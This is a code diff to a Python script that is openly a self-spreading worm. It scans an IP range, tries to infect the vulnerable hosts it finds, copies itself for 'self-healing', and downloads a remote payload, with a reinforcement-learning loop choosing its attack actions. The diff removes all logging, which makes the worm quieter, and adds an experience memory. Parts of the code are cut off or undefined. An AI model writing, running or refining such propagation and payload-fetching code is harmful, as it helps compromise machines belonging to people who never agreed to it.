@@ -1,30 +1,42 @@
 import argparse
-import logging
 import os
 import shutil
 import subprocess
 import sys
 import threading
-import time
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
-from typing import Any, Dict, List, NamedTuple, Optional, Tuple
+from typing import Dict, List, NamedTuple, Optional, Tuple
 import numpy as np
 import psutil
 import signal
+import pickle
 
 class State(NamedTuple):
     ip: str
     state_number: int
 
+class LongTermMemory:
+    """Simple long-term memory for storing past experiences."""
+    def __init__(self):
+        self.memory = {}
+
+    def store(self, state: State, action: int, reward: float, next_state: State):
+        if state not in self.memory:
+            self.memory[state] = []
+        self.memory[state].append((action, reward, next_state))
+
+    def retrieve(self, state: State):
+        return self.memory.get(state, [])
+
+long_term_memory = LongTermMemory()
+
 def choose_action(q_table: Dict[State, Dict[int, float]], state: State, exploration_probability: float) -> int:
     """Choose a random action to take with probability exploration_probability, or the best action otherwise."""
     if np.random.rand() < exploration_probability:
-        logging.debug("Choosing random action due to exploration probability")
         return np.random.randint(0, 4)
     else:
-        logging.debug("Choosing best action based on Q-table")
         return max(q_table[state].items(), key=lambda x: x[1])[0]
 
 def take_action(action: int, ip: str) -> Tuple[Optional[float], Optional[State]]:
@@ -37,10 +49,11 @@ def take_action(action: int, ip: str) -> Tuple[Optional[float], Optional[State]]
     }
     
     result = action_map[action](ip)
+    next_state = update_state(current_state, action)
     if result:
-        return REWARD_SUCCESS, update_state(current_state, action)
+        return REWARD_SUCCESS, next_state
     else:
-        return REWARD_FAILURE, update_state(current_state, action)
+        return REWARD_FAILURE, next_state
 
 def try_infect(ip: str) -> bool:
     """Try to infect a machine with an IP address of ip."""
@@ -49,7 +62,6 @@ def try_infect(ip: str) -> bool:
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
         return True
     except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
-        logging.error(f"Error trying to infect {ip}: {e}")
         return False
 
 def perform_self_healing(ip: str) -> bool:
@@ -71,7 +83,6 @@ def perform_self_healing(ip: str) -> bool:
         shutil.copyfile(src, dst)
         return True
     except Exception as e:
-        logging.error(f"Error performing self-healing: {e}")
         return False
 
 def propagate(ip_range: List[str]) -> bool:
@@ -85,7 +96,7 @@ def propagate(ip_range: List[str]) -> bool:
                 if future.result():
                     vulnerable_machines.append(ip)
             except Exception as e:
-                logging.error(f"Error checking vulnerability for {ip}: {e}")
+                pass
 
     for ip in vulnerable_machines:
         try_infect(ip)
@@ -102,11 +113,9 @@ def check_self_awareness(ip: str) -> bool:
     try:
         mem_usage = psutil.Process(os.getpid()).memory_info().rss / (1024 * 1024)
         if mem_usage > MAX_MEMORY:
-            logging.warning("[!] Memory usage exceeded")
             return False
         return True
     except Exception as e:
-        logging.error(f"[!] Error during self-awareness check: {e}")
         return False
 
 def update_state(state: State, action: int) -> State:
@@ -125,42 +134,34 @@ def download_payload(payload_url: str) -> str:
         with urllib.request.urlopen(payload_url) as f:
             return f.read().decode("utf-8")
     except urllib.error.URLError as e:
-        logging.error(f"Error downloading payload: {e}")
         sys.exit(1)
 
 def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -> None:
     q_table: Dict[State, Dict[int, float]] = {State(ip, state_number): {action: 0.0 for action in range(4)} for ip in ip_range for state_number in range(MAX_STATE)}
     state = State(ip_range[0], 0)
 
-    logging.basicConfig(level=logging.INFO)
-
     exploration_probability = 1.0
 
     payload = download_payload(payload_url)
 
     for episode in range(MAX_EPISODES):
-        logging.info(f"Episode {episode + 1}/{MAX_EPISODES}")
-
         action = choose_action(q_table, state, exploration_probability)
-        logging.debug(f"Chose action {action} for state {state}")
-
         reward, next_state = take_action(action, state.ip)
-        logging.debug(f"Received reward {reward} and transitioned to state {next_state}")
 
         if next_state is not None:
             next_action = choose_action(q_table, next_state, exploration_probability)
             q_table[state][action] = q_table[state][action] + LEARNING_RATE * (reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action])
+
+        long_term_memory.store(state, action, reward, next_state)
 
         exploration_probability *= decay_factor
 
         state = next_state if next_state else state
 
         if check_self_awareness(state.ip):
-            logging.info("The agent is self-aware!")
             break
 
         if state.state_number == MAX_STATE:
-            logging.info("The agent has reached the goal state!")
             break
 
         if episode % 10 == 0:
